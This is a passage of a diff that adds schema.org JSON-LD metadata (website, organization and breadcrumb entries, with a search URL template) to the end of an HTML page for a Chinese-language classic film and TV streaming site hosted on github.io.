+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"久久久电影网",
+  "url":"https://jiujiujiudianyingwang-wap.github.io",
+  "potentialAction":{"@type":"SearchAction","target":"https://jiujiujiudianyingwang-wap.github.io/search?q={search_term_string}","query-input":"required name=search_term_string"}
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"Organization",
+  "name":"久久久电影网",
+  "url":"https://jiujiujiudianyingwang-wap.github.io",
+  "description":"经典老电影与热播剧集在线观看平台",
+  "slogan":"久久珍藏每一部值得反复看的好片"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"BreadcrumbList",
+  "itemListElement":[
+    {"@type":"ListItem","position":1,"name":"首页","item":"https://jiujiujiudianyingwang-wap.github.io"},
+    {"@type":"ListItem","position":2,"name":"经典片单","item":"https://jiujiujiudianyingwang-wap.github.io#films"},
+    {"@type":"ListItem","position":3,"name":"热播榜单","item":"https://jiujiujiudianyingwang-wap.github.io#chart"}
+  ]
+}
+</script>
+</body>
+</html>
